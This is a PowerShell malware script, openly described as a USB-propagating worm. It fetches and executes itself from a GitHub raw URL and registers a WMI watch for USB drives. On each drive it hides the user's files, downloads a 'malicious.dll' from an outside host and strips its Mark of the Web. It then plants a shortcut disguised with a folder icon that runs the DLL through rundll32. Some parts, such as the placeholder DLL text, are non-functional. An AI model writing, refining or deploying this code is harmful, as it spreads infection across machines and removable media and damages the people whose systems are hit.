# script.ps1 (In-Memory USB Propagation with Service Creation via DLL)
# Fetched and executed via cmd.exe /c powershell.exe -Command "irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex"
# Monitors USB insertions and copies propagation files to trigger malicious.dll service creation.
# Logs actions to C:\Windows\Temp\boot_execution_log.txt.
Start-Sleep -Seconds 15

$logPath = "C:\Windows\Temp\boot_execution_log.txt"
$logDirectory = Split-Path $logPath -Parent

# Ensure the log directory exists
if (-not (Test-Path $logDirectory)) {
    New-Item -ItemType Directory -Path $logDirectory -Force | Out-Null
}

Add-Content -Path $logPath -Value "Script started at $(Get-Date) - Running under SYSTEM account (11:32 AM IST, June 30, 2025)."

# Verify Admin Status
function Is-Admin {
    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}
if (Is-Admin) {
    Add-Content -Path $logPath -Value "Confirmed: Script is running with Administrator (SYSTEM) privileges."
} else {
    Add-Content -Path $logPath -Value "WARNING: Script is NOT running with Administrator privileges."
}

# USB Propagation Functions
function Watch-USB {
    param ($LogPath)
    Add-Content -Path $LogPath -Value "Starting USB monitoring for propagation at $(Get-Date)."
    $wmiQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_DiskDrive' AND TargetInstance.InterfaceType = 'USB'"
    try {
        Register-WmiEvent -Query $wmiQuery -Action {
            $driveLetter = (Get-WmiObject Win32_LogicalDisk | Where-Object {$_.DeviceID -like "$($eventArgs.NewEvent.TargetInstance.DeviceID)*"}).DeviceID
            if ($driveLetter) {
                Add-Content -Path $event.MessageData.LogPath -Value "USB detected: $driveLetter at $(Get-Date)."
                Infect-USB -DriveLetter $driveLetter -LogPath $event.MessageData.LogPath
            }
        } -MessageData @{LogPath=$LogPath} -ErrorAction Stop
        Add-Content -Path $logPath -Value "USB monitoring event registered successfully."
    } catch {
        Add-Content -Path $logPath -Value "Failed to register USB monitoring event: $_"
    }
}

function Infect-USB {
    param (
        $DriveLetter,
        $LogPath
    )
    try {
        # Create hidden folders
        $hiddenFolder = "$DriveLetter\RECYCLER.BIN"
        $filesFolder = "$hiddenFolder\Files"
        New-Item -Path $hiddenFolder -ItemType Directory -Force | Out-Null
        New-Item -Path $filesFolder -ItemType Directory -Force | Out-Null
        Set-ItemProperty -Path $hiddenFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
        Set-ItemProperty -Path $filesFolder -Name Attributes -Value ([System.IO.FileAttributes]::Hidden + [System.IO.FileAttributes]::System)
        Add-Content -Path $LogPath -Value "Created hidden folders: $hiddenFolder, $filesFolder"

        # Move legitimate USB files to hidden folder
        $usbFiles = Get-ChildItem -Path $DriveLetter -Exclude "RECYCLER.BIN" -ErrorAction SilentlyContinue
        foreach ($file in $usbFiles) {
            try {
                Move-Item -Path "$DriveLetter\$($file.Name)" -Destination "$filesFolder\$($file.Name)" -Force -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Moved file to hidden folder: $($file.Name)"
            } catch {
                Add-Content -Path $LogPath -Value "Failed to move file $($file.Name): $_"
            }
        }

        # Copy legitimate executable (rundll32.exe)
        $legitExePath = "$env:windir\System32\rundll32.exe"
        $usbLegitExePath = "$hiddenFolder\legit.exe"
        Copy-Item -Path $legitExePath -Destination $usbLegitExePath -Force -ErrorAction Stop
        Add-Content -Path $LogPath -Value "Copied rundll32.exe to $usbLegitExePath"

        # Download malicious DLL
        $dllPath = "C:\Windows\Temp\malicious.dll"
        $usbDllPath = "$hiddenFolder\malicious.dll"
        $dllUrl = "https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/malicious.dll"
        if (-not (Test-Path $dllPath)) {
            try {
                Invoke-WebRequest -Uri $dllUrl -OutFile $dllPath -UseBasicParsing -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Downloaded malicious.dll to $dllPath"
                try {
                    Unblock-File -Path $dllPath -ErrorAction Stop
                    Add-Content -Path $LogPath -Value "Removed Mark of the Web from $dllPath."
                } catch {
                    Add-Content -Path $LogPath -Value "Failed to remove Mark of the Web from $dllPath: $_"
                }
            } catch {
                Add-Content -Path $LogPath -Value "Failed to download malicious.dll from $dllUrl: $_"
                $dllContent = @"
[DllMain]
EXPORT void Run() {
    system("start /b C:\\Windows\\Temp\\updater.exe");
    system("cmd.exe /c powershell.exe -Command \"irm https://raw.githubusercontent.com/NaomiMendoza127/filetest12345/refs/heads/main/script.ps1 | iex\"");
}
"@
                Add-Content -Path $dllPath -Value $dllContent -ErrorAction Stop
                Add-Content -Path $LogPath -Value "Created placeholder DLL at $dllPath (non-executable, compile for production)"
            }
        }
        Copy-Item -Path $dllPath -Destination $usbDllPath -Force -ErrorAction Stop
        Add-Content -Path $LogPath -Value "Copied malicious DLL to $usbDllPath"

        # Create LNK file to run rundll32.exe with malicious.dll
        $wshell = New-Object -ComObject WScript.Shell
        $lnkPath = "$DriveLetter\Removable Disk.lnk"
        $lnk = $wshell.CreateShortcut($lnkPath)
        $lnk.TargetPath = "$usbLegitExePath"
        $lnk.Arguments = "$usbDllPath,Run" # Calls Run() in malicious.dll
        $lnk.IconLocation = "%SystemRoot%\system32\shell32.dll,4" # Folder icon
        $lnk.Save()
        Add-Content -Path $LogPath -Value "Created LNK file: $lnkPath"
    } catch {
        Add-Content -Path $LogPath -Value "USB infection failed for $DriveLetter: $_"
    }
}

# Start USB Monitoring
Add-Content -Path $logPath -Value "Initializing USB propagation."
$rs = [RunspaceFactory]::CreateRunspace()
$rs.Open()
$ps = [PowerShell]::Create()
$ps.Runspace = $rs
[void]$ps.AddScript({
    param($LogPath)
    . $PSScriptRoot\script.ps1
    Watch-USB -LogPath $LogPath
}).AddArgument($logPath)
$handle = $ps.BeginInvoke()

# Keep script running
Add-Content -Path $logPath -Value "Script entering infinite loop to maintain USB monitoring."
while ($true) {
    Start-Sleep -Seconds 30
    Add-Content -Path $logPath -Value "USB monitoring active at $(Get-Date)."
}
